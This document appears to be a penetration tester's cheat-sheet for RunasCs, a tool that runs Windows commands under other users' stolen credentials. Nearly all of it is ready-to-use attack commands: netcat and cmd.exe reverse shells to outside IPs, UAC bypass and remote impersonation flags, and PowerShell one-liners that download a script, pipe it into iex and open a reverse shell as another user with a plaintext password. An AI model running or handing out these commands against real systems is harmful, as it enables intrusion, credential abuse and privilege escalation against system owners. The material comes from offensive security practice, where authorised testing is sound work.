<https://github.com/antonioCoco/RunasCs>

Useful tool when you have credentials for other users on the same host, but you cant just evil-winrm into them etc. they might have different privs you could use to get privesc etc 

Examples:
    Run a command as a local user
        RunasCs.exe user1 password1 "cmd /c whoami /all"
    Run a command as a domain user and logon type as NetworkCleartext (8)
        RunasCs.exe user1 password1 "cmd /c whoami /all" -d domain -l 8
    Run a background process as a local user,
        RunasCs.exe user1 password1 "C:\tmp\nc.exe 10.10.10.10 4444 -e cmd.exe" -t 0
    Redirect stdin, stdout and stderr of the specified command to a remote host
        RunasCs.exe user1 password1 cmd.exe -r 10.10.10.10:4444
    Run a command simulating the /netonly flag of runas.exe
        RunasCs.exe user1 password1 "cmd /c whoami /all" -l 9
    Run a command as an Administrator bypassing UAC
        RunasCs.exe adm1 password1 "cmd /c whoami /priv" --bypass-uac
    Run a command as an Administrator through remote impersonation
        RunasCs.exe adm1 password1 "cmd /c echo admin > C:\Windows\admin" -l 8 --remote-impersonation

For powershell: <https://raw.githubusercontent.com/antonioCoco/RunasCs/refs/heads/master/Invoke-RunasCs.ps1>

Oneliner reverse shell as different user:
powershell.exe -c 'wget -useb <https://raw.githubusercontent.com/antonioCoco/RunasCs/refs/heads/master/Invoke-RunasCs.ps1> | iex; Invoke-RunasCs -Username Matt -Password Password1! -Command "cmd.exe -Remote 192.168.98.128:443"'

powershell.exe -c 'wget -useb <https://raw.githubusercontent.com/antonioCoco/RunasCs/refs/heads/master/Invoke-RunasCs.ps1> | iex; Invoke-RunasCs matt2 Password1! -Command "cmd.exe -remote 192.168.98.128:443" -bypassuac'

